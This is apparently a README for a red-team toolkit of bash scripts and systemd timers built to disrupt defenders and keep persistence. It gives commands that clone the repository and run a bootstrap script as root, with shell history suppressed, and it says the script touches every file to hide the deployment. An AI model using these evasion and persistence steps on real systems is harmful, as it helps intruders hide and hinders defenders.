# Explosive Timers

A collection of red team bash scripts and systemd timers designed to disrupt blue teams and enable persistence.

Deploying is easy! Just clone this repo and run the `bootstrap.sh` file as root.

```sh
HISTCONTROL=ignoreboth
git clone https://github.com/camperboy1000/explosive-timers.git
cd explosive-timers
sudo ./bootstrap.sh
```

The bootstrap script will touch every file on the system in an attempt to hide deployment.
